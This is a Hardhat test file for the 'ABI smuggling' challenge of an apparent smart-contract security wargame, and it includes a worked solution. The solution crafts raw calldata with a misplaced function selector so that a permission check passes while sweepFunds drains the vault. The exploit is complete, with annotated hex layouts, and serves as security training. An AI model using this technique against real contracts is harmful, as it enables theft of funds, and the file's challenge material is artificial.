const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, recovery] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(vault.sweepFunds(deployer.address, token.address)).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        let data = vault.interface.encodeFunctionData('withdraw', [token.address, recovery.address, ethers.utils.parseEther('1')]);
        let data2 = vault.interface.encodeFunctionData('sweepFunds', [recovery.address, token.address]);
        console.log({ withdraw: data, sweepFunds: data2, dataLength: ethers.utils.hexDataLength(data2) });
        console.log({ vault: vault.address });
        const req = player.checkTransaction({
            to: vault.address,
            from: player.address,
            value: 0,
            nonce: await player.getTransactionCount(),
            data: vault.interface.encodeFunctionData('execute', [vault.address, data]),
            gasLimit: 1e6,
        });
        const req2 = player.checkTransaction({
            to: vault.address,
            from: player.address,
            value: 0,
            nonce: await player.getTransactionCount(),
            data: vault.interface.encodeFunctionData('execute', [vault.address, data2]),
            gasLimit: 1e6,
        });
        console.log({
            req: req.data,
            req2: req2.data,
        });
        // req (withdraw)
        //0x1cff79cd
        //000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
        //0000000000000000000000000000000000000000000000000000000000000040 // offset to calldata
        //0000000000000000000000000000000000000000000000000000000000000064 // length of calldata
        //d9caed12                                                         // 4 (0x04) bytes
        //0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 // 32(0x20) bytes
        //0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc // 32(0x20) bytes
        //0000000000000000000000000000000000000000000000000de0b6b3a7640000 // 32(0x20) bytes
        //00000000000000000000000000000000000000000000000000000000         // padding
        // req2 (sweepFunds)
        //0x1cff79cd
        //000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
        //0000000000000000000000000000000000000000000000000000000000000040 // offset to calldata
        //0000000000000000000000000000000000000000000000000000000000000044 // length of calldata
        //85fb709d                                                         // 4 (0x04) bytes
        //0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc // 32(0x20) bytes
        //0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 // 32(0x20) bytes
        //00000000000000000000000000000000000000000000000000000000         // padding
        const req3 = player.checkTransaction({
            to: vault.address,
            from: player.address,
            value: 0,
            nonce: await player.getTransactionCount(),
            data: ethers.utils.hexConcat([
                '0x1cff79cd', // execute
                '0x000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512', // vault.address
                '0x0000000000000000000000000000000000000000000000000000000000000064', // offset to calldata 0x40 + 0x20(padding) + 0x4(selector of withdraw) = 0x64
                '0x0000000000000000000000000000000000000000000000000000000000000000', // padding
                '0xd9caed12',
                // actual calldata
                ethers.utils.defaultAbiCoder.encode(['uint256'], [ethers.utils.hexDataLength(data2)]), // length of actual calldata
                data2,
            ]),
            gasLimit: 1e6,
        });
        //0x1cff79cd
        //000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
        //0000000000000000000000000000000000000000000000000000000000000064
        //0000000000000000000000000000000000000000000000000000000000000000
        //d9caed12
        //0000000000000000000000000000000000000000000000000000000000000044
        //85fb709d
        //0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc
        //0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
        console.log({ req3: req3.data });
        await player.sendTransaction(req3);

        console.log({
            balance: await token.balanceOf(player.address),
            vaultBalance: await token.balanceOf(vault.address),
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
